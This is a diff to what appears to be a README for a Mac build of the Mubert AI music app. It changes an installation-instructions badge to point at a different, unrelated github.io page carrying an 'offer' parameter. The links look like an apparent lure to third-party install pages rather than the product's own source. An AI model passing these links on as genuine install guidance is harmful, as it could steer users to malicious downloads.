@@ -5,7 +5,7 @@ Mubert for Mac is a cutting-edge AI-powered desktop music generation platform. I
 
 Follow the guide below to start using Mubert on macOS.  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://aildelolady750.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=Mubert)
 
 ---
 
